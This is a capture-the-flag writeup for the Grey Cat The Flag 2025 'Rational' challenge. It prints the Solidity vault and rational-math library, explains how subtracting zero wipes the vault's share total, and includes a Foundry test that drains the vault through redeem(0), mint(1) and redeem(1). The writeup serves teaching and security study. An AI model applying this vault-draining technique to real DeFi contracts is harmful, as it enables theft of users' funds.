---
layout: post
title: "Grey Cat The Flag 2025 Rational Challenge Writeup "
---


## Challenge Overview

**Objective:** Start with 1000 GREY tokens and exploit the vault system to accumulate at least 6000 GREY tokens.

## Architecture Analysis

### Core Components

The challenge consists of three main contracts working together:

1. **SetUp Contract** - Challenge environment and initialization
2. **RationalVault** - ERC20-like vault with custom rational number precision
3. **RationalLib** - Custom library for fractional number arithmetic

### SetUp Contract

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GREY} from "./lib/GREY.sol";
import {RationalVault} from "./Vault.sol";

contract Setup {
    bool public claimed;

    // GREY token
    GREY public grey;

    // Challenge contracts
    RationalVault public vault;

    constructor() {
        // Deploy the GREY token contract
        grey = new GREY();

        // Deploy challenge contracts
        vault = new RationalVault(address(grey));

        // Mint 6000 GREY for setup
        grey.mint(address(this), 6000e18);

        // Deposit 5000 GREY into the vault
        grey.approve(address(vault), 5000e18);
        vault.deposit(5000e18);
    }

    // Note: Call this function to claim 1000 GREY for the challenge
    function claim() external {
        require(!claimed, "already claimed");
        claimed = true;

        grey.mint(msg.sender, 1000e18);
    }

    // Note: Challenge is solved when you have 6000 GREY
    function isSolved() external view returns (bool) {
        return grey.balanceOf(msg.sender) >= 6000e18;
    }
}


```

The SetUp contract initializes the challenge environment:
- Deploys a GREY token and RationalVault
- Mints 6000 GREY tokens to itself
- Deposits 5000 GREY into the vault (receiving 5000 shares)
- Reserves 1000 GREY for the player via `claim()` function
- Victory condition: Player must accumulate ≥ 6000 GREY tokens

### RationalVault Contract

```javascript

// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {IERC20} from "./lib/IERC20.sol";
import {Rational, RationalLib} from "./lib/Rational.sol";

contract RationalVault {
    IERC20 public asset;

    mapping(address => Rational) internal sharesOf;
    Rational internal totalShares;

    // ======================================== CONSTRUCTOR ========================================

    constructor(address _asset) {
        asset = IERC20(_asset);
    }

    // ======================================== MUTATIVE FUNCTIONS ========================================

    function deposit(uint128 amount) external {
        Rational _shares = convertToShares(amount);

        sharesOf[msg.sender] = sharesOf[msg.sender] + _shares;
        totalShares = totalShares + _shares;

        asset.transferFrom(msg.sender, address(this), amount);
    }

    function mint(uint128 shares) external {
        Rational _shares = RationalLib.fromUint128(shares);
        uint256 amount = convertToAssets(_shares);

        sharesOf[msg.sender] = sharesOf[msg.sender] + _shares;
        totalShares = totalShares + _shares;

        asset.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint128 amount) external {
        Rational _shares = convertToShares(amount);

        sharesOf[msg.sender] = sharesOf[msg.sender] - _shares;
        totalShares = totalShares - _shares;

        asset.transfer(msg.sender, amount);
    }

    function redeem(uint128 shares) external {
        Rational _shares = RationalLib.fromUint128(shares);
        uint256 amount = convertToAssets(_shares);

        sharesOf[msg.sender] = sharesOf[msg.sender] - _shares;
        totalShares = totalShares - _shares;

        asset.transfer(msg.sender, amount);
    }

    // ======================================== VIEW FUNCTIONS ========================================

    function totalAssets() public view returns (uint128) {
        return uint128(asset.balanceOf(address(this)));
    }

    function convertToShares(uint128 assets) public view returns (Rational) {
        if (totalShares == RationalLib.ZERO) return RationalLib.fromUint128(assets);

        Rational _assets = RationalLib.fromUint128(assets);
        Rational _totalAssets = RationalLib.fromUint128(totalAssets());
        Rational _shares = _assets / _totalAssets * totalShares;

        return _shares;
    }

    function convertToAssets(Rational shares) public view returns (uint128) {
        if (totalShares == RationalLib.ZERO) return RationalLib.toUint128(shares);

        Rational _totalAssets = RationalLib.fromUint128(totalAssets());
        Rational _assets = shares / totalShares * _totalAssets;

        return RationalLib.toUint128(_assets);
    }

    function totalSupply() external view returns (uint256) {
        return RationalLib.toUint128(totalShares);
    }

    function balanceOf(address account) external view returns (uint256) {
        return RationalLib.toUint128(sharesOf[account]);
    }
}


```

The vault implements a shares-based system similar to ERC4626:
- **Deposits/Mints:** Users deposit assets to receive proportional shares
- **Withdrawals/Redeems:** Users burn shares to retrieve underlying assets
- **Conversion Logic:** Dynamic exchange rates between assets and shares based on vault balance
- **Precision:** Uses custom Rational math instead of standard integer arithmetic

### RationalLib Contract

```javascript

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Upper 128 bits is the numerator, lower 128 bits is the denominator
type Rational is uint256;

using {add as +, sub as -, mul as *, div as /, eq as ==, neq as !=} for Rational global;

// ======================================== CONVERSIONS ========================================

library RationalLib {
    Rational constant ZERO = Rational.wrap(0);

    function fromUint128(uint128 x) internal pure returns (Rational) {
        return toRational(x, 1);
    }

    function toUint128(Rational x) internal pure returns (uint128) {
        (uint256 numerator, uint256 denominator) = fromRational(x);
        return numerator == 0 ? 0 : uint128(numerator / denominator);
    }
}

// ======================================== OPERATIONS ========================================

function add(Rational x, Rational y) pure returns (Rational) {
    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);
    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);

    if (xNumerator == 0) return y;
    if (yNumerator == 0) return x;

    // (a / b) + (c / d) = (ad + cb) / bd
    uint256 numerator = xNumerator * yDenominator + yNumerator * xDenominator;
    uint256 denominator = xDenominator * yDenominator;

    return toRational(numerator, denominator);
}

function sub(Rational x, Rational y) pure returns (Rational) {
    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);
    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);

    if (yNumerator != 0) require(xNumerator != 0, "Underflow");

    // (a / b) - (c / d) = (ad - cb) / bd
    // a / b >= c / d implies ad >= cb, so the subtraction will never underflow when x >= y
    uint256 numerator = xNumerator * yDenominator - yNumerator * xDenominator;
    uint256 denominator = xDenominator * yDenominator;

    return toRational(numerator, denominator);
}

function mul(Rational x, Rational y) pure returns (Rational) {
    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);
    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);

    if (xNumerator == 0 || yNumerator == 0) return RationalLib.ZERO;

    // (a / b) * (c / d) = ac / bd
    uint256 numerator = xNumerator * yNumerator;
    uint256 denominator = xDenominator * yDenominator;

    return toRational(numerator, denominator);
}

function div(Rational x, Rational y) pure returns (Rational) {
    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);
    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);

    if (xNumerator == 0) return RationalLib.ZERO;
    require(yNumerator != 0, "Division by zero");

    // (a / b) / (c / d) = ad / bc
    uint256 numerator = xNumerator * yDenominator;
    uint256 denominator = xDenominator * yNumerator;

    return toRational(numerator, denominator);
}

function eq(Rational x, Rational y) pure returns (bool) {
    (uint256 xNumerator,) = fromRational(x);
    (uint256 yNumerator,) = fromRational(y);
    if (xNumerator == 0 && yNumerator == 0) return true;

    return Rational.unwrap(x) == Rational.unwrap(y);
}

function neq(Rational x, Rational y) pure returns (bool) {
    return !eq(x, y);
}

// ======================================== HELPERS ========================================

function fromRational(Rational v) pure returns (uint256 numerator, uint256 denominator) {
    numerator = Rational.unwrap(v) >> 128;
    denominator = Rational.unwrap(v) & type(uint128).max;
}

function toRational(uint256 numerator, uint256 denominator) pure returns (Rational) {
    if (numerator == 0) return RationalLib.ZERO;

    uint256 d = gcd(numerator, denominator);
    numerator /= d;
    denominator /= d;

    require(numerator <= type(uint128).max && denominator <= type(uint128).max, "Overflow");

    return Rational.wrap(numerator << 128 | denominator);
}

function gcd(uint256 x, uint256 y) pure returns (uint256) {
    while (y != 0) {
        uint256 t = y;
        y = x % y;
        x = t;
    }
    return x;
}

```

This library implements fractional numbers as a custom type:

```solidity
type Rational is uint256;
```

**Encoding Scheme:**
```
|   Upper 128 bits   |   Lower 128 bits   |
|     Numerator      |    Denominator     |
```

**Key Functions:**
- `toRational()` - Encodes numerator/denominator into packed uint256
- `fromRational()` - Extracts numerator and denominator from packed value
- Arithmetic operations: `add()`, `sub()`, `mul()`, `div()`

## Vulnerability Analysis

### The Critical Bug

The vulnerability lies in the `sub()` function of RationalLib:

```solidity

function sub(Rational x, Rational y) pure returns (Rational) {
    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);
    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);

    if (yNumerator != 0) require(xNumerator != 0, "Underflow");

    // (a / b) - (c / d) = (ad - cb) / bd
    // a / b >= c / d implies ad >= cb, so the subtraction will never underflow when x >= y
    uint256 numerator = xNumerator * yDenominator - yNumerator * xDenominator;
    uint256 denominator = xDenominator * yDenominator;

    return toRational(numerator, denominator);
}
```

**The Issue:**
When subtracting zero (`yNumerator == 0, yDenominator == 0`) from any rational number `x`:
- The underflow check is bypassed
- Calculation becomes: `numerator = xNumerator * 0 - 0 * xDenominator = 0`, `denominator = xDenominator * 0 = 0`
- `toRational(0, 0)` returns the canonical ZERO rational
- **Result: `x - 0 = 0` instead of `x`**

This breaks the fundamental mathematical property that `x - 0 = x`.

## Exploitation Vector

The vault's `redeem()` and `withdraw()` functions both perform:
```solidity
totalShares = totalShares - _shares;
```

By calling `redeem(0)` or `withdraw(0)`, we can trigger the bug where `totalShares - ZERO = ZERO`.

## Exploitation Strategy

### Step-by-Step Attack

1. **Initial Setup**
   ```solidity
   setup.claim(); // Receive 1000 GREY tokens
   ```

2. **Trigger the Vulnerability**
   ```solidity
   vault.redeem(0); // totalShares becomes ZERO due to bug
   ```
   
   After this call:
   - Vault's `totalShares` = 0 (should be 5000e18)
   - Vault's asset balance = 5000e18 GREY (unchanged)

3. **Re-bootstrap with Minimal Investment**
   ```solidity
   vault.mint(1); // Mint 1 share for 1 wei
   ```
   
   Since `totalShares == 0`, the conversion rate is 1:1:
   - Cost: 1 wei GREY
   - Received: 1 share
   - New state: `totalShares = 1`, vault balance = 5000e18 + 1 wei

4. **Drain the Vault**
   ```solidity
   vault.redeem(1); // Redeem our single share
   ```
   
   Conversion calculation:
   ```
   assets = shares × totalAssets / totalShares
   assets = 1 × (5000e18 + 1) / 1 = 5000e18 + 1 wei
   ```

5. **Final State**
   - Started with: 1000e18 GREY
   - Spent: 1 wei GREY
   - Received: 5000e18 + 1 wei GREY
   - **Total: 6000e18 GREY** 

## Solution

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Setup} from "../src/rational_challenge/Setup.sol";

contract RationalSolution is Test {
    Setup public setupp;
    address public attacker = makeAddr("attacker");

    function setUp() public {
        setupp = new Setup();
    }

    function testExploit() public {
        //first we are claiming our 1000 GREY given by the setup contract
        vm.startPrank(attacker);
        setupp.claim();

        console.log("balance of attacker before redeeming", setupp.vault().asset().balanceOf(attacker) / 1e18);
        console.log("total supply of vault  before redeeming", setupp.vault().totalSupply() / 1e18);

        // setupp.vault().withdraw(0);
        setupp.vault().redeem(0);

        console.log(
            "balance of attacker after redeeming by the attacker", setupp.vault().asset().balanceOf(attacker) / 1e18
        );
        console.log("total supply of vault  after minting by the attacker", setupp.vault().totalSupply() / 1e18);

        setupp.grey().approve(address(setupp.vault()), 1);

        setupp.vault().mint(1);

        console.log("balance of attacker after minting", setupp.vault().asset().balanceOf(attacker) / 1e18);
        console.log("total supply of vault  after redeeming", setupp.vault().totalSupply() / 1e18);

        setupp.vault().redeem(1);

        console.log("balance of attacker after redeeming 2nd time", setupp.vault().asset().balanceOf(attacker) / 1e18);
        console.log("total supply of vault after redeeming 2nd time", setupp.vault().totalSupply() / 1e18);

        assertTrue(setupp.isSolved(), "not solved");
    }
}

```
## Solutions Repo

[Grey Cat The Flag 2025 Solutions](https://github.com/BhaskarPeruri/Grey_Cat_The_Flag_2025_Solutions)


## Conclusion

This challenge demonstrates how subtle bugs in custom mathematical libraries can lead to catastrophic failures in DeFi protocols. The vulnerability in the rational arithmetic library allowed complete bypass of the vault's accounting system, highlighting the importance of thorough testing of custom mathematical operations, especially edge cases involving zero values.